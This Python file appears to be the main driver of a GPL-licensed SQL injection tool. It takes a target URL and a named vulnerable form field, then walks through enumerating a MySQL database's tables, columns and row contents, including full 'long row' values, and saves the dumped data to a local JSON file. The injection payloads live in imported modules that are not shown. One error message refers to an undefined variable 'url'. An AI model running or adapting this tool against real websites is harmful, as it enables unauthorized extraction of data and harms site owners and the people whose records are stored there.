#!/usr/bin/python
# 
# Enumerate details of a MySQL database through a form field that is vulnerable to SQL injection 
# Copyright (C) 2019
# Salman Raza <raza.salman@gmail.com>
#
# GNU General Public License v3.0
#
# This program is free software: you can redistribute it and/or modify it under the terms
# of the GNU General Public License as published by the Free Software Foundation, either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
# even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General
# Public License for more details.
#
# You should have received a copy of the GNU General Public License along with this program.
# If not, see <https://www.gnu.org/licenses/>

import os
from MySQLEnum import *
from UserInput import *
from builtins import input
import json

def construct_data(post_args, vuln_field):
    '''Construct the data that will be sent as a part of the GET or POST request to the target. One of these fields is specified as being vulnerable in the command line arguments, on which the SQL injection will be done.'''
    retval = {}
    
    if ":" not in post_args:
        print(clr.red("\n[!]") + "At least one parameter value must be set or if there is no parameter it should be left blank (E.g. -d 'param1:')\n   Exiting ...\n".format(vuln_field))
        exit(0)
    
    for i in post_args.split(","):
        param = i.split(":")
        retval[param[0]] = param[1]
        
    
    if vuln_field not in retval:
        print(clr.red("\n[!]") + "Vulnerable field '{}' not found in provided post arguments... exiting\n".format(vuln_field))
        exit(1)
    
    return retval

def show_enum_rows_option(target):
    '''Prompt if the user wishes to enumerate rows'''
        
    while True:
        if enumerate_rows(target):
        
            msg = "Enumerate rows? [y/n, default:n]: "
            again = input(msg)
                
            if again == "n":   
                break   
        else:
            break
    
def enumerate_rows(target):
    '''Present the options and prompts for selecting tables, columns, number of rows to enumerate'''

    enumerated_rows = []
    user_input = UserInput(target=target)
    table, col = user_input.show_prompts()
    selected_table = table['selected']
    num_rows = table['num_rows']
    selected_col = col['selected']
    selected_limit = col['limit']
    
    print("\nTable selected: {} {}".format(clr.red(selected_table),clr.yellow("({} rows)".format(num_rows))))
    print("Column selected: {}".format(clr.red(selected_col)))
    print("\nEnumerating rows for {}.{}\n".format(clr.red(selected_table), clr.red(selected_col)))
    
    try:
        curr_rows = target.get_curr_enum_rows(selected_table,selected_col)
        
        if selected_limit == len(curr_rows):    
            print(render_rows(curr_rows,selected_col))
        else:
            if len(curr_rows) > 0:   
                enumerated_rows = enumerated_rows + curr_rows
        
            rows = target.generate_rows(selected_col, selected_table, selected_limit)
        
            for row in rows:
                enumerated_rows.append(row)
                
            print(render_rows(enumerated_rows,selected_col))
            
        if(len(target.get_long_rows_for_table_col(selected_table, selected_col)) > 0):

            if input("Long rows present, enumerate them? [y/n, default:n]: ") in ['y','']:
                user_input.select_long_row()
                enumerate_long_rows(target, user_input.long_row, selected_table, selected_col)            
        return True
        
    except KeyboardInterrupt:
    
        print("\nRow enumeration aborted, partial enumeration results for {}.{}:\n".format(clr.red(selected_table),clr.red(selected_col)))
        print(render_rows(enumerated_rows,selected_col))
        
        if input("Continue enumerating rows for other tables? [y/n, default:n]: ") == 'y':
            enumerate_rows(target)
        else:
            return False

def enumerate_long_rows(target, long_row, table, col):
       '''Enumerate the complete contents of a selected long row'''

       full_content = target.get_long_row_content(str(long_row), table, col)
       target.DB['tables'][table]['cols'][col][long_row][0] = str(len(full_content))
       target.DB['tables'][table]['cols'][col][long_row][1] = full_content
       target.long_rows[table][col].remove(long_row)

       print("\nContents for '{}.{}[{}]':\n{}\n".format(table, col, long_row, full_content))

def get_file_name(url):
    '''Get the name of the json file that was saved for a particular url'''
    
    file = '-'.join(url.split('/')[2:])
    return './{}.json'.format(file)

def show_results(target):
    '''Print enumeration results'''
    
    print_db_info(target.DB, format="table")
    print(clr.yellow("\nENUMERATED TABLES FOR: {}\n".format(clr.red(target.DB['params']['target_url']))))
    print_table_info(target.DB, format="table")

def set_params(kwargs, params_from_file):
    '''Set commandline parameters provided with the -f switch. If a parameter is provided it is used, otherwise it is taken from the json file saved earlier.'''
    
    retval = {}
    
    for key,val in kwargs.items():

        if val is not None:
            retval[key] = val
        else:
            retval[key] = params_from_file[key]
    
    return retval

def start(*args,**kwargs):
    '''Main program loop'''

    file_read = kwargs['file_read']
    args_init = dict(kwargs)
    del args_init['file_read']
    file_name = get_file_name(kwargs['target_url'])
    
    if file_read:
        if os.path.isfile(file_name):
            
            with open(file_name, 'r') as f:
                db = json.load(f)

            args_init = set_params(args_init, db['params'])
            target = MYSQLENUM(args_init)
            target.DB = db
            target.DB['params'] = args_init
            target.populate_long_rows()
            # enumerate_rows(target)
            show_enum_rows_option(target)
        else:
            print(clr.red("\n[!]") + "File '{}' not found for URL: {}\n   Exiting ...\n".format(file_name,url))
            exit(1)
    else:
        kwargs['data'] = construct_data(kwargs['data'], kwargs['vuln_field'])
        print(clr.red("\nENUMERATING DATABASE ...\n"))

        target = MYSQLENUM(kwargs)
        target.enumerate()
        show_results(target)
        show_enum_rows_option(target)
        
    with open(file_name, 'w') as fp:
        json.dump(target.DB, fp, indent=4)
